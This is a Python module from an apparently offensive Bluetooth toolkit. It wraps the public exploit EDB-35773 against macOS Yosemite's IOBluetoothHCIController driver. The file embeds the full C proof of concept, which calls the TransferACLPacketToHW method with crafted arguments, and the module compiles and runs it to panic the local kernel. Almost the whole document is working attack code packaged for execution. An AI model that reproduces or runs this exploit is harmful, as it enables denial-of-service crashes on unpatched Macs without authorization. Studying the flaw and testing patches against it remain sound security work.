"""
BlueSploit Module: macOS TransferACLPacketToHW Panic
EDB-ID: 35773  (Yosemite 10.10, @rpaleari & @joystick)

Original C PoC embedded verbatim; compiled and run at module execution time.
"""

from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import print_error, print_info, print_warning, Colors
from core.utils.c_runner import compile_and_run, find_compiler
from core.utils.iokit import is_macos


C_SOURCE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>

struct BluetoothCall {
  uint64_t args[7];
  uint64_t sizes[7];
  uint64_t index;
};

int main(void) {
  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
                                IOServiceMatching("IOBluetoothHCIController"));
  if (!service) return -1;
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) return kr;
  printf(" [+] port: %d\n", port);

  struct BluetoothCall a;
  memset(&a, 0, sizeof(a));
  a.sizes[0] = 0x1000;
  a.args[0] = (uint64_t) calloc(a.sizes[0], sizeof(char));
  a.sizes[1] = 0x1000;
  a.args[1] = (uint64_t) calloc(a.sizes[1], sizeof(char));
  memset((void *)a.args[1], 0x22, 0x1000);
  a.index = 0x63;

  kr = IOConnectCallMethod((mach_port_t) port, 0, NULL, 0,
                           (const void*) &a, sizeof(a),
                           NULL, NULL, NULL, NULL);
  printf("kr: %08x\n", kr);
  return IOServiceClose(port);
}
"""


class Module(DosModule):
    info = ModuleInfo(
        name="dos/macos_iobt_transferacl",
        description="macOS TransferACLPacketToHW panic (EDB-35773, native C)",
        author=["@rpaleari", "@joystick"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=["https://www.exploit-db.com/exploits/35773"],
    )

    def _setup_options(self) -> None:
        self.options = {}

    def run(self) -> bool:
        C = Colors
        print(f"\n  {C.RED}{'─'*55}{C.RESET}")
        print(f"  {C.BOLD}macOS TransferACLPacketToHW DoS (EDB-35773){C.RESET}")
        print(f"  {C.RED}{'─'*55}{C.RESET}")
        if not is_macos():
            print_error("macOS only")
            return False
        if not find_compiler():
            print_error("No C compiler, install Xcode CLI tools")
            return False
        print_warning("Will panic the local kernel if unpatched")

        rc, out, err = compile_and_run(
            C_SOURCE, "iobt_transferacl",
            ldflags=["-framework", "IOKit"],
        )
        if rc == -1:
            print_error(err.strip())
            return False
        print_info(out)
        if err.strip():
            print_warning(err.strip())
        self.add_result({"edb_id": 35773, "rc": rc})
        return rc == 0
